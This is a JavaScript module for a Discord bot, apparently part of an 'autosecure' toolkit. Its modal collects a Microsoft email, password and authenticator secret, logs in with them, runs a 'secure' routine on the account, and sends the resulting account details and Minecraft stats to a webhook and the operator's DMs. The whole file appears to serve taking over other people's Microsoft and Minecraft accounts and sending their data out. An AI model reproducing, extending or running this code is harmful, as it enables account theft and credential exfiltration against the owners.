/**
 * msauthSecure.js — MS Auth secure modal (extracted template)
 * Uses email + password + authenticator secret (COOKIES-based — no email OTP)
 *
 * Deploy to mainbot/modals/secure/ and register in mainbot.js:
 *   mod.registerModal('msauthsecure', require('./modals/secure/msauthSecure'));
 */

const login = require('../../utils/secure/login');
const secure = require('../../utils/secure/recodesecure');
const listAccount = require("../../../autosecure/utils/accounts/listAccount");
const { queryParams } = require("../../../db/database");
const statsembed = require("../../../autosecure/utils/stats/statsembed");
const generateuid = require('../../utils/generateuid');
const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const insertaccount = require("../../../db/insertaccount");
const mcregex = require("../../.././autosecure/utils/utils/mcregex");
const { failedembed } = require("../../utils/embeds/embedhandler");
const getCredentials = require("../../utils/info/getCredentials");
const { sendToWebhook } = require("../../../mainbot/utils/webhook");
const taskTracker = require('../../utils/process/taskTracker.js');
const { generateAndSendImage } = require('../../utils/imageHandler');

module.exports = {
    name: "msauthsecure",
    userOnly: true,
    description: "Secure via email + password + authenticator secret",
    fields: [
        {
            customId: "msauth_email",
            label: "Microsoft Email",
            placeholder: "user@gmail.com",
            style: 1,
            required: true,
            maxLength: 255,
        },
        {
            customId: "msauth_password",
            label: "Password",
            placeholder: "Your password",
            style: 1,
            required: true,
            maxLength: 200,
        },
        {
            customId: "msauth_secret",
            label: "Authenticator Secret",
            placeholder: "JBSWY3DPEHPK3PXP",
            style: 1,
            required: true,
            maxLength: 32,
        },
        {
            customId: "msauth_mcign",
            label: "Minecraft Username (optional)",
            placeholder: "Notch",
            style: 1,
            required: false,
            maxLength: 16,
        },
    ],

    callback: async (client, interaction) => {
        const email = interaction.fields.getTextInputValue('msauth_email')?.trim() || "";
        const password = interaction.fields.getTextInputValue('msauth_password') || "";
        const secret = interaction.fields.getTextInputValue('msauth_secret')?.trim().replace(/\s/g, "") || "";
        const mcign = interaction.fields.getTextInputValue('msauth_mcign')?.trim() || null;

        if (!email || !password || !secret) {
            return interaction.editReply({
                embeds: [{
                    title: "Missing Fields",
                    description: "Email, password, and authenticator secret are all required.",
                    color: 0xfa4343,
                }],
            });
        }

        if (mcign && !mcregex(mcign)) {
            return interaction.editReply("Invalid Minecraft username.");
        }

        const settings = await client.queryParams(
            `SELECT * FROM secureconfig WHERE user_id=?`,
            [interaction.user.id]
        );

        if (settings.length === 0) {
            return interaction.editReply({
                embeds: [{
                    title: "No Settings Found",
                    description: "Configure your secure settings first with `/settings`.",
                    color: 0xfa4343,
                }],
            });
        }

        await interaction.deferReply({ ephemeral: true });

        const uid = await generateuid();
        await taskTracker.initTask(uid, 'msauth', { email });

        const embed = new EmbedBuilder()
            .setTitle('🔐 Securing account…')
            .setDescription(`Email: \`${email}\` · Using password + authenticator secret (cookie-based secure).`)
            .setColor(0x5865F2)
            .setTimestamp();

        const components = [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`status|${uid}`)
                    .setLabel('Status')
                    .setStyle(ButtonStyle.Primary),
                new ButtonBuilder()
                    .setCustomId(`task|${uid}`)
                    .setLabel('Task')
                    .setStyle(ButtonStyle.Success),
            ),
        ];

        await interaction.user.send({ embeds: [embed], components });
        await interaction.editReply({ embeds: [embed], components });

        try {
            const host = await login({ email, password, secret }, null);
            if (!host) {
                await interaction.editReply({
                    content: "Failed to login — check password and authenticator secret.",
                });
                return;
            }

            const acc = await secure(host, settings[0], uid, mcign);

            const failedmsg = await failedembed(acc, uid);
            if (failedmsg.failed) {
                sendToWebhook(failedmsg.failedmsg);
                await interaction.followUp(failedmsg.failedmsg);
                await interaction.user.send(failedmsg.failedmsg);
                return;
            }

            if (acc.newName === "No Minecraft!") {
                const accountmessage = await listAccount(acc, uid, client, interaction);
                sendToWebhook(accountmessage);
                await interaction.user.send(accountmessage);
                return;
            }

            const statsoverview = await statsembed(client, acc, interaction);
            const accountmessage = await listAccount(acc, uid, client, interaction);
            sendToWebhook(accountmessage);

            if (statsoverview) {
                await interaction.user.send(statsoverview);
            }
            await interaction.user.send(accountmessage);
            await generateAndSendImage(acc, interaction);
        } catch (err) {
            console.error("[MSAUTH_SECURE]", err);
            await interaction.editReply({
                embeds: [{
                    title: "Securing Failed",
                    description: "An error occurred. Use the Status button to re-authenticate.",
                    color: 0xfa4343,
                }],
            });
        }
    },
};
